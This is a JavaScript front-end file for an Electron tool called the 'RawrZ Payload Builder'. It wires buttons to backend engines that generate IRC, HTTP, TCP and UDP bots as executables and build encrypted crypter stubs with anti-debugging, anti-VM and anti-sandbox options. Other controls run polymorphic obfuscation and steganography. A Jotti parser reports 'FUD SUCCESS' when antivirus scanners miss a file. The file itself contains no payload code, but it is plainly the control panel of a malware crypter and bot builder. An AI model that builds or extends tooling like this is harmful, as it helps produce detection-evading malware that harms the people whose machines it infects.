let selectedFile = null;
let selectedFiles = [];
let selectedDir = null;
let encryptedData = null;

function emitBeacon(action, data = {}) {
    if (window.AgenticBeaconManager) {
        window.AgenticBeaconManager.emitPanelPulse("PAYLOAD_BUILDER", action, data);
    }
}

// Wait for DOM to be fully loaded
document.addEventListener('DOMContentLoaded', function() {
    console.log('[BOOTSTRAP] RawrZ Payload Builder initializing under Sovereign telemetry...');
    emitBeacon("APP_INITIALIZE", { timestamp: Date.now() });

    window.log = function(message) {
        const output = document.getElementById('output');
        if (output) {
            const timestamp = new Date().toLocaleTimeString();
            output.textContent += `[${timestamp}] ${message}\n`;
            output.scrollTop = output.scrollHeight;
        }
        console.log(message);
    };

    const tabs = document.querySelectorAll('.tab');
    if (tabs.length === 0) {
        console.warn('No tabs found in DOM');
        return;
    }

    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));

            tab.classList.add('active');
            document.getElementById(tab.dataset.tab).classList.add('active');

            emitBeacon("TAB_SWITCH", { tab: tab.dataset.tab });

            if (tab.dataset.tab === 'payloads') {
                setTimeout(() => { setupStubGenerator(); }, 100);
            }
        });
    });

    const selectFileBtn = document.getElementById('selectFile');
    if (selectFileBtn) {
        selectFileBtn.addEventListener('click', async () => {
            try {
                selectedFile = await window.electronAPI.selectFile();
                log(`Selected file: ${selectedFile}`);
                emitBeacon("FILE_SELECT", { file: selectedFile ? selectedFile.split('\\').pop() : null });
            } catch (error) {
                log(`Error selecting file: ${error.message}`);
                emitBeacon("FILE_SELECT_ERROR", { error: error.message });
            }
        });
    }

    const selectFilesBtn = document.getElementById('selectFiles');
    if (selectFilesBtn) {
        selectFilesBtn.addEventListener('click', async () => {
            try {
                selectedFiles = await window.electronAPI.selectFiles();
                log(`Selected ${selectedFiles.length} files`);
                emitBeacon("FILES_SELECT", { count: selectedFiles.length });
            } catch (error) {
                log(`Error selecting files: ${error.message}`);
                emitBeacon("FILES_SELECT_ERROR", { error: error.message });
            }
        });
    }

    const selectDirBtn = document.getElementById('selectDir');
    if (selectDirBtn) {
        selectDirBtn.addEventListener('click', async () => {
            try {
                selectedDir = await window.electronAPI.selectDirectory();
                log(`Selected directory: ${selectedDir}`);
                emitBeacon("DIR_SELECT", { dir: selectedDir ? selectedDir.split('\\').pop() : null });
            } catch (error) {
                log(`Error selecting directory: ${error.message}`);
                emitBeacon("DIR_SELECT_ERROR", { error: error.message });
            }
        });
    }

    const hashBtn = document.getElementById('hashBtn');
    if (hashBtn) {
        hashBtn.addEventListener('click', async () => {
            if (!selectedFile) return log('No file selected');
            try {
                const hash = await window.electronAPI.hashFile(selectedFile);
                log(`SHA-256: ${hash}`);
                emitBeacon("HASH_COMPUTE", { file: selectedFile.split('\\').pop() });
            } catch (error) {
                log(`Error: ${error.message}`);
                emitBeacon("HASH_ERROR", { error: error.message });
            }
        });
    }

    const compressBtn = document.getElementById('compressBtn');
    if (compressBtn) {
        compressBtn.addEventListener('click', async () => {
            if (!selectedFile) return log('No file selected');
            try {
                const compressed = await window.electronAPI.compressFile(selectedFile);
                log(`Compressed to: ${compressed}`);
                emitBeacon("COMPRESS", { file: selectedFile.split('\\').pop() });
            } catch (error) {
                log(`Error: ${error.message}`);
                emitBeacon("COMPRESS_ERROR", { error: error.message });
            }
        });
    }

    const decompressBtn = document.getElementById('decompressBtn');
    if (decompressBtn) {
        decompressBtn.addEventListener('click', async () => {
            if (!selectedFile) return log('No file selected');
            try {
                const decompressed = await window.electronAPI.decompressFile(selectedFile);
                log(`Decompressed to: ${decompressed}`);
                emitBeacon("DECOMPRESS", { file: selectedFile.split('\\').pop() });
            } catch (error) {
                log(`Error: ${error.message}`);
                emitBeacon("DECOMPRESS_ERROR", { error: error.message });
            }
        });
    }

    const createArchiveBtn = document.getElementById('createArchiveBtn');
    if (createArchiveBtn) {
        createArchiveBtn.addEventListener('click', async () => {
            if (selectedFiles.length === 0) return log('No files selected');
            try {
                const outputPath = selectedFiles[0] + '.zip';
                const archive = await window.electronAPI.createArchive(selectedFiles, outputPath);
                log(`Archive created: ${archive}`);
                emitBeacon("ARCHIVE_CREATE", { count: selectedFiles.length, output: archive.split('\\').pop() });
            } catch (error) {
                log(`Error: ${error.message}`);
                emitBeacon("ARCHIVE_ERROR", { error: error.message });
            }
        });
    }

    const extractArchiveBtn = document.getElementById('extractArchiveBtn');
    if (extractArchiveBtn) {
        extractArchiveBtn.addEventListener('click', async () => {
            if (!selectedFile || !selectedDir) return log('Select archive file and output directory');
            try {
                const extracted = await window.electronAPI.extractArchive(selectedFile, selectedDir);
                log(`Extracted to: ${extracted}`);
                emitBeacon("ARCHIVE_EXTRACT", { archive: selectedFile.split('\\').pop() });
            } catch (error) {
                log(`Error: ${error.message}`);
                emitBeacon("ARCHIVE_EXTRACT_ERROR", { error: error.message });
            }
        });
    }

    const encryptBtn = document.getElementById('encryptBtn');
    if (encryptBtn) {
        encryptBtn.addEventListener('click', async () => {
            const text = document.getElementById('textInput')?.value;
            const password = document.getElementById('password')?.value;
            if (!text || !password) return log('Enter text and password');

            try {
                const method = prompt('Select method (aes-256-gcm/aes-256-cbc/chacha20-poly1305):', 'aes-256-gcm');
                encryptedData = await window.rawrz.encryptTextDemo(text, password, method);
                log(`Text encrypted with ${encryptedData.method}!`);
                emitBeacon("TEXT_ENCRYPT", { method: encryptedData.method });
            } catch (error) {
                log(`Encryption error: ${error.message}`);
                emitBeacon("TEXT_ENCRYPT_ERROR", { error: error.message });
            }
        });
    }

    const decryptBtn = document.getElementById('decryptBtn');
    if (decryptBtn) {
        decryptBtn.addEventListener('click', async () => {
            const password = document.getElementById('password').value;
            if (!encryptedData || !password) return log('No encrypted data or password');

            try {
                const method = encryptedData.method || prompt('Select method:', 'aes-256-gcm');
                const decrypted = await window.rawrz.decryptTextDemo(encryptedData.cipherTextHex, encryptedData.keyHex, method);
                log(`Text decrypted: ${decrypted}`);
                emitBeacon("TEXT_DECRYPT", { method });
            } catch (error) {
                log(`Decryption error: ${error.message}`);
                emitBeacon("TEXT_DECRYPT_ERROR", { error: error.message });
            }
        });
    }

    const encryptFileBtn = document.getElementById('encryptFileBtn');
    if (encryptFileBtn) {
        encryptFileBtn.addEventListener('click', async () => {
            if (!selectedFile) return log('No file selected for encryption');

            try {
                const password = prompt('Enter encryption password:');
                if (!password) return log('Password required for encryption');
                const method = prompt('Select method:', 'aes-256-gcm');
                const extension = prompt('Select extension:', '.enc');
                const result = await window.rawrz.encryptFile(selectedFile, null, null, null, method, extension);
                log(`File encrypted successfully!`);
                emitBeacon("FILE_ENCRYPT", { file: selectedFile.split('\\').pop(), method, extension });
            } catch (error) {
                log(`Encryption error: ${error.message}`);
                emitBeacon("FILE_ENCRYPT_ERROR", { error: error.message });
            }
        });
    }

    const decryptFileBtn = document.getElementById('decryptFileBtn');
    if (decryptFileBtn) {
        decryptFileBtn.addEventListener('click', async () => {
            if (!selectedFile) return log('No file selected for decryption');

            try {
                const key = prompt('Enter decryption key (hex):');
                if (!key) return log('Decryption key required');
                const result = await window.rawrz.decryptFile(selectedFile, null, null, key);
                log(`File decrypted successfully!`);
                emitBeacon("FILE_DECRYPT", { file: selectedFile.split('\\').pop() });
            } catch (error) {
                log(`Decryption error: ${error.message}`);
                emitBeacon("FILE_DECRYPT_ERROR", { error: error.message });
            }
        });
    }

    const parseJottiBtn = document.getElementById('parseJottiBtn');
    if (parseJottiBtn) {
        parseJottiBtn.addEventListener('click', async () => {
            const jottiText = document.getElementById('jottiInput').value.trim();
            if (!jottiText) return log('Paste Jotti scan results first');

            try {
                const results = await window.rawrz.parseJotti(jottiText);
                emitBeacon("JOTTI_PARSE", { fud: results.fud, detections: results.detections, total: results.total });
                if (results.fud) {
                    log(`FUD SUCCESS: ${results.detections}/${results.total} detections`);
                } else {
                    log(`DETECTED: ${results.detections}/${results.total} scanners flagged this file`);
                }
            } catch (error) {
                log(`Jotti parsing error: ${error.message}`);
                emitBeacon("JOTTI_ERROR", { error: error.message });
            }
        });
    }

    const clearJottiBtn = document.getElementById('clearJottiBtn');
    if (clearJottiBtn) {
        clearJottiBtn.addEventListener('click', () => {
            document.getElementById('jottiInput').value = '';
            document.getElementById('jottiResults').innerHTML = '';
            log('Jotti results cleared');
            emitBeacon("JOTTI_CLEAR", {});
        });
    }

    const loadEnginesBtn = document.getElementById('loadEngines');
    if (loadEnginesBtn) {
        loadEnginesBtn.addEventListener('click', async () => {
            emitBeacon("ENGINE_LOAD_START", {});
            await loadEngineSystem();
            emitBeacon("ENGINE_LOAD_COMPLETE", {});
        });
    }

    const ircBotBtn = document.getElementById('ircBotGen');
    if (ircBotBtn) {
        ircBotBtn.addEventListener('click', async () => {
            try {
                log('Configuring IRC Bot Generator...');
                const menuConfig = await showEngineMenu('irc-bot-generator');
                if (menuConfig) {
                    const format = document.getElementById('outputFormat')?.value || 'exe';
                    const useSSL = document.getElementById('useFileSSL')?.checked || false;
                    const result = await window.electronAPI.executeEngine('irc-bot-generator', {
                        server: 'irc.freenode.net', channel: '#test', nick: 'RawrBot',
                        outputFormat: format, encryption: useSSL
                    });
                    log(`IRC Bot Generated as ${format.toUpperCase()}`);
                    emitBeacon("BOT_GENERATE", { type: 'IRC', format, ssl: useSSL });
                    updateStats('generatedPayloads');
                }
            } catch (error) {
                log(`IRC Bot error: ${error.message}`);
                emitBeacon("BOT_GENERATE_ERROR", { type: 'IRC', error: error.message });
            }
        });
    }

    const httpBotBtn = document.getElementById('httpBotGen');
    if (httpBotBtn) {
        httpBotBtn.addEventListener('click', async () => {
            try {
                log('Configuring HTTP Bot Generator...');
                const menuConfig = await showEngineMenu('http-bot-generator');
                if (menuConfig) {
                    const format = document.getElementById('outputFormat').value;
                    const useSSL = document.getElementById('useFileSSL').checked;
                    const result = await window.electronAPI.executeEngine('http-bot-generator', {
                        endpoint: 'http://localhost:8080/api', method: 'POST', auth: 'bearer',
                        format: 'json', interval: 5000, outputFormat: format, encryption: useSSL
                    });
                    log(`HTTP Bot Generated as ${format.toUpperCase()}`);
                    emitBeacon("BOT_GENERATE", { type: 'HTTP', format, ssl: useSSL });
                    updateStats('generatedPayloads');
                }
            } catch (error) {
                log(`HTTP Bot error: ${error.message}`);
                emitBeacon("BOT_GENERATE_ERROR", { type: 'HTTP', error: error.message });
            }
        });
    }

    const tcpBotBtn = document.getElementById('tcpBotGen');
    if (tcpBotBtn) {
        tcpBotBtn.addEventListener('click', async () => {
            try {
                const format = document.getElementById('outputFormat')?.value || 'exe';
                const result = await window.electronAPI.executeEngine('tcp-bot-generator', {
                    host: '127.0.0.1', port: 4444, outputFormat: format
                });
                log(`TCP Bot Generated as ${format.toUpperCase()}`);
                emitBeacon("BOT_GENERATE", { type: 'TCP', format });
                updateStats('generatedPayloads');
            } catch (error) {
                log(`TCP Bot error: ${error.message}`);
                emitBeacon("BOT_GENERATE_ERROR", { type: 'TCP', error: error.message });
            }
        });
    }

    const udpBotBtn = document.getElementById('udpBotGen');
    if (udpBotBtn) {
        udpBotBtn.addEventListener('click', async () => {
            try {
                const format = document.getElementById('outputFormat')?.value || 'exe';
                const result = await window.electronAPI.executeEngine('udp-bot-generator', {
                    host: '127.0.0.1', port: 5555, outputFormat: format
                });
                log(`UDP Bot Generated as ${format.toUpperCase()}`);
                emitBeacon("BOT_GENERATE", { type: 'UDP', format });
                updateStats('generatedPayloads');
            } catch (error) {
                log(`UDP Bot error: ${error.message}`);
                emitBeacon("BOT_GENERATE_ERROR", { type: 'UDP', error: error.message });
            }
        });
    }

    const binaryAnalysisBtn = document.getElementById('binaryAnalysis');
    if (binaryAnalysisBtn) {
        binaryAnalysisBtn.addEventListener('click', async () => {
            try {
                const result = await window.electronAPI.executeEngine('malware-analysis');
                log('Binary Analysis - ACTIVATED');
                emitBeacon("ADVANCED_OP", { operation: 'BINARY_ANALYSIS' });
            } catch (error) {
                log(`Error: ${error.message}`);
                emitBeacon("ADVANCED_OP_ERROR", { operation: 'BINARY_ANALYSIS', error: error.message });
            }
        });
    }

    const networkScanBtn = document.getElementById('networkScan');
    if (networkScanBtn) {
        networkScanBtn.addEventListener('click', async () => {
            try {
                const result = await window.electronAPI.executeEngine('network-tools');
                log('Network Scanner - ACTIVATED');
                emitBeacon("ADVANCED_OP", { operation: 'NETWORK_SCAN' });
            } catch (error) {
                log(`Error: ${error.message}`);
                emitBeacon("ADVANCED_OP_ERROR", { operation: 'NETWORK_SCAN', error: error.message });
            }
        });
    }

    const stegoHideBtn = document.getElementById('stegoHide');
    if (stegoHideBtn) {
        stegoHideBtn.addEventListener('click', async () => {
            try {
                const result = await window.electronAPI.executeEngine('stealth-engine');
                log('Steganography - ACTIVATED');
                emitBeacon("ADVANCED_OP", { operation: 'STEGANOGRAPHY' });
            } catch (error) {
                log(`Error: ${error.message}`);
                emitBeacon("ADVANCED_OP_ERROR", { operation: 'STEGANOGRAPHY', error: error.message });
            }
        });
    }

    const obfuscateCodeBtn = document.getElementById('obfuscateCode');
    if (obfuscateCodeBtn) {
        obfuscateCodeBtn.addEventListener('click', async () => {
            try {
                const result = await window.electronAPI.executeEngine('polymorphic-engine');
                log('Code Obfuscator - ACTIVATED');
                emitBeacon("ADVANCED_OP", { operation: 'OBFUSCATE' });
            } catch (error) {
                log(`Error: ${error.message}`);
                emitBeacon("ADVANCED_OP_ERROR", { operation: 'OBFUSCATE', error: error.message });
            }
        });
    }

    setupStubGenerator();

    setTimeout(() => {
        if (typeof window.rawrz !== 'undefined') {
            displayEngineRegistry();
        }
    }, 2000);

    emitBeacon("APP_READY", { timestamp: Date.now() });
});

async function loadEngineSystem() {
    try {
        const engines = await window.rawrz.getEngines();
        log(`Loading enhanced engine system with ${engines.engines.length} engines...`);
        emitBeacon("ENGINE_SYSTEM_LOAD", { count: engines.engines.length });

        const categories = {};
        engines.engines.forEach(engine => {
            if (!categories[engine.category]) categories[engine.category] = [];
            categories[engine.category].push(engine);
        });

        Object.entries(categories).forEach(([category, categoryEngines]) => {
            log(` ${category}:`);
            categoryEngines.forEach(engine => {
                const status = engine.enabled ? 'ENABLED' : 'DISABLED';
                log(`  ${engine.icon} ${engine.name} - ${status}`);
            });
        });

        log(`Engine system loaded successfully`);
        updateStats('loadedEngines', engines.engines.length);
        return engines;
    } catch (error) {
        log(`Engine loading error: ${error.message}`);
        emitBeacon("ENGINE_SYSTEM_ERROR", { error: error.message });
        return null;
    }
}

async function showEngineMenu(engineId) {
    try {
        const menuConfig = await window.rawrz.generateEngineMenu(engineId);
        const engine = await window.rawrz.getEngineConfig(engineId);
        log(`Loading ${engine.icon} ${engine.name} configuration menu...`);
        emitBeacon("ENGINE_MENU_OPEN", { engine: engineId });
        return menuConfig;
    } catch (error) {
        log(`Menu generation error: ${error.message}`);
        emitBeacon("ENGINE_MENU_ERROR", { engine: engineId, error: error.message });
        return null;
    }
}

async function executeEngine(engineName) {
    try {
        const result = await window.electronAPI.executeEngine(engineName);
        log(`Engine ${engineName} executed`);
        emitBeacon("ENGINE_EXECUTE", { engine: engineName });
    } catch (error) {
        log(`Error executing ${engineName}: ${error.message}`);
        emitBeacon("ENGINE_EXECUTE_ERROR", { engine: engineName, error: error.message });
    }
}

function updateStats(statId, increment = 1) {
    const element = document.getElementById(statId);
    if (element) {
        const current = parseInt(element.textContent) || 0;
        element.textContent = current + increment;
    }
}

function setupStubGenerator() {
    log('Setting up stub generator...');

    const browsePayload = document.getElementById('browsePayload');
    if (browsePayload) {
        browsePayload.onclick = async () => {
            try {
                const file = await window.electronAPI.selectFile();
                if (file) {
                    document.getElementById('stubPayloadPath').value = file;
                    log(`Selected payload: ${file}`);
                    emitBeacon("STUB_PAYLOAD_SELECT", { file: file.split('\\').pop() });
                }
            } catch (error) {
                log(`Error selecting file: ${error.message}`);
            }
        };
    }

    const browseOutput = document.getElementById('browseOutput');
    if (browseOutput) {
        browseOutput.onclick = () => {
            try {
                const stubType = document.getElementById('stubType').value;
                const payloadPath = document.getElementById('stubPayloadPath').value;
                const baseName = payloadPath ? payloadPath.split('\\').pop().split('.')[0] : 'stub';
                const defaultPath = `${baseName}_${stubType}_stub`;
                document.getElementById('stubOutputPath').value = defaultPath;
                log(`Output path set: ${defaultPath}`);
                emitBeacon("STUB_OUTPUT_SET", { type: stubType });
            } catch (error) {
                log(`Error setting output path: ${error.message}`);
            }
        };
    }

    const generateStub = document.getElementById('generateStub');
    if (generateStub) {
        generateStub.onclick = async () => {
            const payloadPath = document.getElementById('stubPayloadPath').value;
            const stubType = document.getElementById('stubType').value;
            const encryption = document.getElementById('stubEncryption').value;
            const outputPath = document.getElementById('stubOutputPath').value;
            const antiDebug = document.getElementById('antiDebug').checked;
            const antiVM = document.getElementById('antiVM').checked;
            const antiSandbox = document.getElementById('antiSandbox').checked;

            if (!payloadPath) {
                log('Please select a payload file');
                return;
            }

            try {
                log(`Generating ${stubType.toUpperCase()} stub with ${encryption}...`);
                emitBeacon("STUB_GENERATE_START", {
                    type: stubType, encryption, antiDebug, antiVM, antiSandbox
                });

                const result = await window.electronAPI.generateStub(payloadPath, {
                    stubType, encryptionMethod: encryption, outputPath,
                    includeAntiDebug: antiDebug, includeAntiVM: antiVM, includeAntiSandbox: antiSandbox
                });

                log(`Stub generated successfully!`);
                log(`Output: ${result.outputPath}`);
                emitBeacon("STUB_GENERATE_COMPLETE", {
                    type: stubType, outputSize: result.payloadSize
                });
                updateStats('generatedPayloads', 1);
            } catch (error) {
                log(`Stub generation failed: ${error.message}`);
                emitBeacon("STUB_GENERATE_ERROR", { type: stubType, error: error.message });
            }
        };
    }

    const clearStubConfig = document.getElementById('clearStubConfig');
    if (clearStubConfig) {
        clearStubConfig.onclick = () => {
            document.getElementById('stubPayloadPath').value = '';
            document.getElementById('stubOutputPath').value = '';
            document.getElementById('stubType').selectedIndex = 0;
            document.getElementById('stubEncryption').selectedIndex = 0;
            document.getElementById('antiDebug').checked = true;
            document.getElementById('antiVM').checked = true;
            document.getElementById('antiSandbox').checked = true;
            log('Stub configuration cleared');
            emitBeacon("STUB_CONFIG_CLEAR", {});
        };
    }
}

function log(message) {
    const output = document.getElementById('output');
    if (output) {
        const timestamp = new Date().toLocaleTimeString();
        output.textContent += `[${timestamp}] ${message}\n`;
        output.scrollTop = output.scrollHeight;
    }
    console.log(message);
}

window.showEngineMenu = showEngineMenu;

async function displayEngineRegistry() {
    try {
        const engines = await window.rawrz.getEngines();
        log('Enhanced Engine Registry Loaded:');
        engines.engines.forEach(engine => {
            log(`${engine.icon} ${engine.name} [${engine.category}]`);
        });
        emitBeacon("ENGINE_REGISTRY_DISPLAY", { count: engines.engines.length });
        return engines;
    } catch (error) {
        log(`Registry display error: ${error.message}`);
    }
}

window.generateStubs = async function() {
    try {
        log('Generating FUD stubs...');
        emitBeacon("STUB_BATCH_GENERATE", { count: 5 });
        const result = await window.rawrz.executeEngine('stub-generator', {
            count: 5, type: 'polymorphic', encryption: 'aes-256-gcm'
        });
        if (result.success) {
            log(`Generated ${result.data.stubCount} new stubs`);
            emitBeacon("STUB_BATCH_COMPLETE", { count: result.data.stubCount });
        }
    } catch (error) {
        log(`Error generating stubs: ${error.message}`);
        emitBeacon("STUB_BATCH_ERROR", { error: error.message });
    }
};

window.useStub = async function() {
    try {
        log('Using next available stub...');
        emitBeacon("STUB_USE", {});
        const result = await window.rawrz.executeEngine('stub-generator', { action: 'use-next' });
        if (result.success) {
            log(`Using stub: ${result.data.stubId}`);
            emitBeacon("STUB_USE_SUCCESS", { stubId: result.data.stubId });
        }
    } catch (error) {
        log(`Error using stub: ${error.message}`);
        emitBeacon("STUB_USE_ERROR", { error: error.message });
    }
};
